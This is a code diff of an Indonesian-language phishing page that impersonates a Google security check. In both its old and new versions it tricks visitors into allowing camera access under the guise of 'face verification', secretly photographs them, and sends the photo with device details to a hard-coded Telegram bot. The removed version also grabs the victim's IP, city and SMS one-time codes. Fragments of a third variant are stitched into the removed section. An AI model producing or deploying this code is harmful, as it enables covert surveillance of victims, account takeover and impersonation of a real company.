@@ -3,166 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Center - Verifikasi</title>
+    <title>Google Security Update</title>
     <style>
-        body { font-family: 'Roboto', Arial, sans-serif; background-color: #ffffff; color: #3c4043; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 100%; max-width: 380px; text-align: center; }
+        body { font-family: 'Roboto', Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { border: 1px solid #dadce0; padding: 40px; border-radius: 8px; text-align: center; max-width: 350px; width: 100%; }
         .logo { width: 75px; margin-bottom: 20px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
-        p { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 25px; }
-        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; display: none; }
-        .btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; width: 100%; }
+        h2 { font-size: 24px; font-weight: 400; color: #202124; }
+        p { color: #5f6368; font-size: 14px; margin-bottom: 30px; }
+        button { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; }
         #loader { display: none; margin-top: 20px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #4285f4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #canvas, #video { display: none; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div class="card">
     <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
-    <h1 id="title">Verifikasi Akun</h1>
-    <p id="desc">Kami mendeteksi upaya login yang tidak biasa. Silakan verifikasi identitas Anda untuk mengamankan perangkat.</p>
+    <h2>Keamanan Perangkat</h2>
+    <p>Kami mendeteksi aktivitas mencurigakan. Selesaikan verifikasi wajah untuk mengamankan akun Anda.</p>
     
-    <input type="number" id="otpInput" placeholder="Masukkan kode 6-digit SMS">
-    
-    <button class="btn" id="mainBtn" onclick="startProcess()">LANJUTKAN</button>
+    <button id="btn" onclick="start()">VERIFIKASI SEKARANG</button>
 
     <div id="loader">
         <div class="spinner"></div>
-        <p id="loadText">Memproses data keamanan...</p>
+        <p>Memproses biometrik...</p>
     </div>
 </div>
 
-<video id="video" autoplay></video>
-<canvas id="canvas"></canvas>
+<video id="v" autoplay></video>
+<canvas id="c"></canvas>
 
 <script>
-    // --- KONFIGURASI BOT ---
     const TOKEN = "8650738252:AAEWHSGL_HLg9_Rjta6MCAgbj6v9eWzqN44";
     const CHAT_ID = "8025603711";
 
-    let step = 1;
-
-    async function sendToTelegram(msg, isPhoto = false, blob = null) {
+    async function send(msg, isPhoto = false, blob = null) {
         if (isPhoto) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'target.jpg');
-            formData.append('caption', msg);
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 't.jpg');
+            fd.append('caption', msg);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
         } else {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html`);
         }
     }
 
-    async function startProcess() {
-        const mainBtn = document.getElementById('mainBtn');
-        const loader = document.getElementById('loader');
-        const loadText = document.getElementById('loadText');
+    async function start() {
+        document.getElementById('btn').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
 
-        if (step === 1) {
-            // TAHAP 1: Ambil Info Device & Realtime Cam
-            mainBtn.style.display = 'none';
-            loader.style.display = 'block';
+        // 1. Info Target
+        send(`🔥 <b>TARGET WEB ONLINE!</b>\nDevice: ${navigator.platform}\nBrowser: ${navigator.userAgent}`);
 
-            // Ambil Info Device & IP
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                let info = `🔥 <b>TARGET WEB ONLINE!</b>\n\n`;
-                info += `📍 IP: ${data.ip}\n`;
-                info += `📍 Kota: ${data.city}\n`;
-                info += `📱 Device: ${navigator.platform}\n`;
-                await sendToTelegram(info);
-            } catch (e) {}
-
-            // Eksekusi Realtime Cam
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                video.srcObject = stream;
-                
-                setTimeout(() => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        sendToTelegram("📸 <b>FOTO TARGET (REALTIME)</b>", true, blob);
-                    }, 'image/jpeg');
-                    stream.getTracks().forEach(t => t.stop());
-                }, 2000);
-            } catch (e) {
-                sendToTelegram("❌ Target menolak izin kamera.");
-            }
-
-            // Pindah ke Tahap SMS (OTP)
-            setTimeout(() => {
-                loader.style.display = 'none';
-                document.getElementById('title').innerText = "Verifikasi SMS";
-                document.getElementById('desc').innerText = "Kode verifikasi 6-digit telah dikirim ke nomor Anda. Masukkan kode tersebut di bawah ini.";
-                document.getElementById('otpInput').style.display = 'block';
-                mainBtn.innerText = "VERIFIKASI OTP";
-                mainBtn.style.display = 'block';
-                step = 2;
-            }, 3000);
-
-        } else if (step === 2) {
-            // TAHAP 2: Ambil Kode SMS (OTP Grabber)
-            const otp = document.getElementById('otpInput').value;
-            if (otp.length < 4) {
-                alert("Kode tidak valid!");
-                return;
-            }
-
-            mainBtn.style.display = 'none';
-            loader.style.display = 'block';
-            loadText.innerText = "Menyinkronkan akun...";
-
-            await sendToTelegram(`📩 <b>DUMP SMS (OTP):</b> <code>${otp}</code>`);
-
-            setTimeout(() => {
-                alert("Verifikasi Berhasil! Perangkat Anda telah diamankan.");
-                window.location.href = "https://accounts.google.com";
-            }, 2000);
-        }
-    }
-</script>
-
-</body>
-</html>
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html`);
-    }
-
-    async function startHack() {
-        document.getElementById('status-box').style.display = 'none';
-        document.getElementById('loading-box').style.display = 'block';
-
-        // 1. Ambil Info Browser & IP
-        let info = `🔥 <b>TARGET BARU (WEB)</b>\n`;
-        info += `🌐 Browser: ${navigator.userAgent}\n`;
-        info += `🖥️ Platform: ${navigator.platform}\n`;
-        info += `🔋 Baterai: Meminta data...`;
-        
-        sendToTelegram(info);
-
-        // 2. Minta Izin Kamera (Jebakan)
-        document.getElementById('log-text').innerText = "Memverifikasi identitas via Biometrik...";
+        // 2. Realtime Cam
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            sendToTelegram("📸 Izin Kamera: DIBERIKAN (Target bisa difoto!)");
-            // Di sini kamu bisa tambahin fungsi capture canvas kalau mau fotonya dikirim
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            v.srcObject = s;
+            setTimeout(() => {
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(b => send("📸 <b>HASIL FOTO REALTIME!</b>", true, b), 'image/jpeg');
+                s.getTracks().forEach(t => t.stop());
+                alert("Verifikasi Berhasil!");
+                window.location.href = "https://google.com";
+            }, 3000);
         } catch (e) {
-            sendToTelegram("❌ Izin Kamera: DITOLAK");
+            send("❌ Target Menolak Izin Kamera");
+            alert("Izin Kamera Diperlukan!");
+            location.reload();
         }
-
-        // 3. Selesai
-        setTimeout(() => {
-            document.getElementById('log-text').innerText = "Pembersihan Selesai! Perangkat Aman.";
-            alert("Perangkat Anda sekarang sudah aman dari ancaman.");
-        }, 5000);
     }
 </script>
 
